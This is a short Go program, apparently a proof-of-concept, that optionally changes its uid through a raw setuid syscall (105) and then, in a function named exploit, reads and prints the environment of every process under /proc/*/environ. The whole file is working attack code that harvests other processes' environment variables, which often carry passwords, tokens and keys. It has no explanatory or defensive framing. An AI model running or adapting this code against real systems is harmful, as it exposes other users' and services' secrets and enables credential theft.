package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"syscall"
)

func main() {
	printIDs()

	if len(os.Args) > 1 {
		uid, err := strconv.Atoi(os.Args[1])
		if err != nil {
			log.Printf("Could not parse uid to set: %v", err)
			os.Exit(1)
		}

		log.Printf("Setting uid to %d", uid)
		_, _, e1 := syscall.RawSyscall(105, uintptr(uid), 0, 0)
		if e1 != 0 {
			log.Printf("Setuid returned error: %v", e1)
		}
		// err = syscall.Setuid(uid)
		// if err != nil {
		// 	log.Printf("Setuid returned error: %v", err)
		// }

		printIDs()
	}
	exploit()
}

func printIDs() {
	fmt.Printf("uid=%v, euid=%v\n", os.Getuid(), os.Geteuid())
}

func exploit() {
	envs, err := filepath.Glob("/proc/[0-9]*/environ")
	if err != nil {
		log.Fatalf("Could not read environments: %v", err)
	}

	for _, env := range envs {
		f, err := os.Open(env)
		if err != nil {
			log.Printf("Could not open %q: %v", env, err)
			continue
		}
		fmt.Println()
		fmt.Printf("Exploiting %s\n", env)
		io.Copy(os.Stdout, f)
		f.Close()
		fmt.Println()
	}
}
